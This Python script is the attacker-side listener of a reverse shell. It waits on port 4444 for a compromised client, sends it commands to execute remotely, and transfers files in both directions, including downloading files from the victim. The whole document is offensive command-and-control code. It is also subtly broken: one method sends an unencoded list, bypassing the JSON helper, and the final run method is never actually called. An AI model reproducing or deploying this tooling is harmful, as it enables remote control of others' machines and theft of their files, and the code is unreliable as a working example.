#!/usr/bin/env python

import base64
import json
import socket


local_ip = '127.0.0.1'
port = 4444


class Listener:

    def __init__(self, local_ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((local_ip, port))
        listener.listen(0)
        print('[+] Waiting for incoming connection...')
        self.connection, address = listener.accept()
        print(f'[+] Client connected [{address}]')

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    def reliable_receive(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.connection.send(command)
        if command[0] == 'exit':
            self.connection.close()
        return self.reliable_receive()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while True:
            command = input('>> ')
            command = command.split(' ')
            try:
                if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(str(file_content))
                result = self.execute_remotely(command)
                if command[0] == 'download' and '[-] Error ' not in result:
                    result = self.write_file(command[1], result)
            except Exception:
                result = "[-] Error during command execution"
            print(result)


my_listener = Listener(local_ip, port)
my_listener.run
